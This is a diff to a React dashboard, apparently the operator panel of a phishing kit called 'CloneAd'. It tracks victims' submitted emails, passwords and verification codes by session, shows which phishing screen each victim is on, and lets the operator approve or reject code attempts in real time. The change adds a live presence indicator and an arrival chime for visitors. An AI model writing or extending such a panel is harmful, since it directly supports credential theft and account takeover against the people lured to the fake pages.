@@ -7,6 +7,7 @@ import { Badge } from "@/components/ui/badge";
 import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity, History, Radio, Volume2, VolumeX, Monitor } from "lucide-react";
 import { toast } from "sonner";
 import { ADMIN_BASE } from "@/lib/admin-route";
+import { subscribeToOnlineVisitors } from "@/lib/presence";
 
 interface LeadRow {
   id: string;
@@ -68,30 +69,25 @@ function deviceLabel(ua: string | null): string {
   return "Web";
 }
 
-/**
- * Toca um "ding" curto via WebAudio. Sem assets externos.
- * Frequência por tipo de evento pra você diferenciar de ouvido.
- */
-function playDing(kind: "email" | "password" | "code") {
+/** Som de entrada de visitante (transição offline→online). */
+function playOnlineDing() {
   try {
     const Ctx = (window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext);
     if (!Ctx) return;
     const ctx = new Ctx();
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
-    const freq = kind === "email" ? 660 : kind === "password" ? 880 : 1100;
-    osc.type = "sine";
-    osc.frequency.value = freq;
+    osc.type = "triangle";
+    osc.frequency.setValueAtTime(520, ctx.currentTime);
+    osc.frequency.linearRampToValueAtTime(780, ctx.currentTime + 0.18);
     gain.gain.setValueAtTime(0.0001, ctx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.25, ctx.currentTime + 0.02);
-    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.45);
+    gain.gain.exponentialRampToValueAtTime(0.3, ctx.currentTime + 0.02);
+    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.5);
     osc.connect(gain).connect(ctx.destination);
     osc.start();
-    osc.stop(ctx.currentTime + 0.5);
-    setTimeout(() => ctx.close().catch(() => {}), 700);
-  } catch {
-    /* silencioso — som é cosmético */
-  }
+    osc.stop(ctx.currentTime + 0.55);
+    setTimeout(() => ctx.close().catch(() => {}), 800);
+  } catch { /* silencioso */ }
 }
 
 export default function Dashboard() {
@@ -105,6 +101,31 @@ export default function Dashboard() {
   useEffect(() => {
     soundOnRef.current = soundOn;
   }, [soundOn]);
+
+  /** Sessões com aba aberta + visível agora. */
+  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
+
+  // Subscreve presença global de visitantes
+  useEffect(() => {
+    if (!user) return;
+    const knownRef = { current: new Set<string>() };
+    const off = subscribeToOnlineVisitors(
+      (map) => {
+        const ids = new Set(map.keys());
+        setOnlineSessionIds(ids);
+        knownRef.current = ids;
+      },
+      (sessionId) => {
+        // Toca som só quando alguém ENTRA (transição offline→online)
+        if (!knownRef.current.has(sessionId) && soundOnRef.current) {
+          playOnlineDing();
+          setPulse(true);
+          setTimeout(() => setPulse(false), 600);
+        }
+      },
+    );
+    return off;
+  }, [user]);
 
   useEffect(() => {
     document.title = "Painel — CloneAd";
@@ -136,15 +157,6 @@ export default function Dashboard() {
           setLeads((prev) => [r, ...prev]);
           setPulse(true);
           setTimeout(() => setPulse(false), 600);
-          if (soundOnRef.current) {
-            const kind: "email" | "password" | "code" =
-              r.field_name === "email_submitted"
-                ? "email"
-                : r.field_name === "password_submitted"
-                ? "password"
-                : "code";
-            playDing(kind);
-          }
         },
       )
       .on(
@@ -399,6 +411,7 @@ export default function Dashboard() {
               <table className="w-full text-sm">
                 <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                   <tr>
+                    <th className="px-4 py-3 text-left font-medium">Status</th>
                     <th className="px-4 py-3 text-left font-medium">Última atividade</th>
                     <th className="px-4 py-3 text-left font-medium">
                       <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
@@ -419,8 +432,12 @@ export default function Dashboard() {
                     // - tem senha → já passou da escolha, está na tela do código
                     // - só tem e-mail → na tela de escolha (senha ou código)
                     const screenLabel = hasPassword ? "Tela código" : "Tela escolha";
+                    const isOnline = onlineSessionIds.has(s.session_id);
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
+                        <td className="whitespace-nowrap px-4 py-3 text-xs">
+                          <StatusDot online={isOnline} />
+                        </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                           {formatTime(s.lastActivity)}
                         </td>
@@ -474,6 +491,7 @@ export default function Dashboard() {
               actionable
               busy={busy}
               onAction={send}
+              onlineSessionIds={onlineSessionIds}
             />
           )}
         </section>
@@ -515,6 +533,7 @@ export default function Dashboard() {
               actionable={false}
               busy={busy}
               onAction={send}
+              onlineSessionIds={onlineSessionIds}
             />
           )}
         </section>
@@ -551,24 +570,47 @@ function StatCard({
   );
 }
 
+function StatusDot({ online }: { online: boolean }) {
+  if (online) {
+    return (
+      <span className="inline-flex items-center gap-1.5 text-success">
+        <span className="relative flex h-2 w-2">
+          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-75" />
+          <span className="relative inline-flex h-2 w-2 rounded-full bg-success" />
+        </span>
+        <span className="text-[11px] font-medium">online</span>
+      </span>
+    );
+  }
+  return (
+    <span className="inline-flex items-center gap-1.5 text-muted-foreground">
+      <span className="h-2 w-2 rounded-full bg-muted-foreground/40" />
+      <span className="text-[11px]">offline</span>
+    </span>
+  );
+}
+
 function AttemptsTable({
   rows,
   leads,
   actionable,
   busy,
   onAction,
+  onlineSessionIds,
 }: {
   rows: AttemptRow[];
   leads: LeadRow[];
   actionable: boolean;
   busy: string | null;
   onAction: (row: AttemptRow, action: "approve" | "reject") => void;
+  onlineSessionIds: Set<string>;
 }) {
   return (
     <div className="overflow-x-auto">
       <table className="w-full text-sm">
         <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
           <tr>
+            <th className="px-4 py-3 text-left font-medium">Status</th>
             <th className="px-4 py-3 text-left font-medium">Hora</th>
             <th className="px-4 py-3 text-left font-medium">
               <span className="inline-flex items-center gap-1">
@@ -598,6 +640,7 @@ function AttemptsTable({
         <tbody>
           {rows.map((row) => {
             const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
+            const isOnline = onlineSessionIds.has(row.session_id);
             return (
               <tr
                 key={row.key}
@@ -605,6 +648,9 @@ function AttemptsTable({
                   actionable ? "bg-primary/5" : "hover:bg-muted/30"
                 }`}
               >
+                <td className="whitespace-nowrap px-4 py-3 text-xs">
+                  <StatusDot online={isOnline} />
+                </td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                   {formatTime(row.codeAt)}
                 </td>
